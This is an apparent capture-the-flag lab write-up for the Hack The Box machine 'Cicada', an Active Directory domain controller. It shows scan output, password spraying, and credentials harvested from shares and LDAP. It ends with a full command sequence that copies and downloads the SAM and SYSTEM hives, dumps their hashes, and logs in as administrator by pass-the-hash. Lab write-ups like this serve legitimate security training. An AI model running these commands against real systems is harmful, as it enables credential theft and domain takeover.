# Cicada

## Nmap scan:
```
Nmap scan report for 10.129.17.126
Host is up (0.018s latency).
Not shown: 65522 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-17 22:46:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-06-17T22:48:10+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-06-17T22:48:10+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-06-17T22:48:10+00:00; +7h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-06-17T22:48:10+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
55370/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-06-17T22:47:31
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
```

## Writeup:
Quick nmap scan reveals SMB open over `445`. 
This allows anonymous access, with the following shares provided:
```
Share Name                Type            Comment
----------------------------------------------------------------------
ADMIN$                    DISK (SPECIAL)  Remote Admin
C$                        DISK (SPECIAL)  Default share
DEV                       DISK            
HR                        DISK            
IPC$                      IPC (SPECIAL)   Remote IPC
NETLOGON                  DISK            Logon server share 
SYSVOL                    DISK            Logon server share 
```

None can be accessed, with the exception of `HR`.
This contains a text file named `Notice from HR.txt`.
This file contains the following line:
- `Your default password is: Cicada$M6Corpb*@Lp#nZp!8`

Using `nxc` with the `--rid-brute` I am able to enumerate users, and with a quick password spraying attack using the previously accquired passwords I login as `michael.wrightson`.

Thus valid credentials:
- `michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`

With Michael's account I query `ldap` using `nxc` and the `--users` flag.
This grants me more credentials, as user `david.orelious` has the following within his user description:
- `Just in case I forget my password is aRt$Lp#7t*VQ!3`

Through David's account I can access the previously inaccesible `DEV` share.
This contains a file called: `Backup_script.ps1`.

Incredibly enough, this contains even more credentials:
```
$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
```

Now with Emily's credentials, I decide to try logging in via `winrm`  with `evil-winrm`.
This works, and I'm able to grab the `user.txt` from `C:\Users\emily.oscars.CICADA\Desktop`

Emily's user has the following privileges:
```
Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

The `SeBackupPrivilege` and `SeRestorePrivilege` privileges allow us to privilege escalate.

First we run the following in `C:\Users\emily.oscars.cicada\`:
```
echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
echo "create" | out-file ./diskshadow.txt -encoding ascii -append        
echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append
```

Then we run:
- `diskshadow.exe /s c:\users\emily.oscars.cicada\Diskshadow.txt`

Then these two:
- `robocopy /b Z:\Windows\System32\Config C:\Users\emily.oscars.cicada\ SAM`
- `robocopy /b Z:\Windows\System32\Config C:\Users\emily.oscars.cicada\ SYSTEM`

Then we can download them to our host via some inbuilt `evil-winrm` functionality:
- `download SAM`
- `download SYSTEM`

Finally we grab hashes as so:
- `secretsdump.py -sam SAM -system SYSTEM LOCAL`

Then we can login through `winrm` using the Administrator's hash:
- `evil-winrm -i cicada.htb -u 'administrator' -H '<hash>'`

## Commands Used:
